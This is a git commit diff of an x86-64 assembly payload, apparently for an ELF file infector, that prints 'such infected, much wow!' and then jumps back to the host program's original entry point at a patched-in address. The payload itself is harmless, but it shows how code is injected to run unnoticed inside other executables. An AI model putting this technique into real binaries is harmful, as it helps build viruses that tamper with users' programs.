a56d951d327bc66f617bd64a783dd4d6e646cd05
Markus Faerevaag <m@frv.ag>
2017-09-12 13:29:38 +0900

    Fix segfault by saving and restoring cpu state

--- payload.s
+++ payload.s
@@ -2,18 +2,28 @@ section .text
   global _start
 
 _start:
-  mov rax,1       ; [1] - sys_write
-  mov rdi,1       ; 0 = stdin / 1 = stdout / 2 = stderr
-  lea rsi,[rel msg]     ; pointer(mem address) to msg (*char[])
-  mov rdx, msg_end - msg      ; msg size
-  syscall         ; calls the function stored in rax
+  ;; save cpu state
+  push rax
+  push rdi
+  push rsi
+  push rdx
 
-  mov rax, 0x1111111111111111
+  ;; write msg to stdout
+  mov rax,1                     ; [1] - sys_write
+  mov rdi,1                     ; 0 = stdin / 1 = stdout / 2 = stderr
+  lea rsi,[rel msg]             ; pointer(mem address) to msg (*char[])
+  mov rdx, msg_end - msg        ; msg size
+  syscall                       ; calls the function stored in rax
+
+  ;; restore cpu state
+  pop rdx
+  pop rsi
+  pop rdi
+  pop rax
+
+  ;; jump to _main
+  mov rax, 0x1111111111111111   ; address changed during injection
   jmp rax
-
-  mov rax,60      ; [60] - sys_exit
-  mov rdi,42      ; exit with code rdx(0)
-  syscall
 
 align 8
   msg     db 0x1b,'[31msuch infected, much wow!',0x1b,'[0m',0x0a,0
